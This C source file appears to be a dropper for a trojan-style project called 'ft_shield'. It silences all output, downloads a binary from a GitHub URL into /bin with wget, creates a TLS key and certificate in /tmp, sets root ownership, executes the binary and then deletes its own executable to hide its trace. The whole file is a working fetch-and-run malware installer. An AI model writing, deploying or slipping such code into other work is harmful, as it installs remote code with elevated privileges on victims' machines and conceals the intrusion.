#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void download_file() {
    char cmd[256];
    const char *url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/src/ft_shield/ft_shield";

    memset(cmd, 0,256);
    snprintf(cmd, sizeof(cmd), "wget -O /bin/ft_shield %s", url);
    system(cmd);
}

int main(int ac, char **av) {
    (void)ac;
    
    printf("hkrifa\n");
    int fd = open("/dev/null", O_RDWR, 0);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    download_file();
    system("openssl req -x509 -newkey rsa:2048 -keyout /tmp/ft_shield_key.pem -out /tmp/ft_shield_cert.pem -sha256 -days 365 -nodes -subj \"/CN=localhost\"");
    system("chown root:root /bin/ft_shield");
    system("chmod 755 /bin/ft_shield");
    system("/bin/ft_shield");

    close(fd);
    remove(av[0]);

    return 0;
}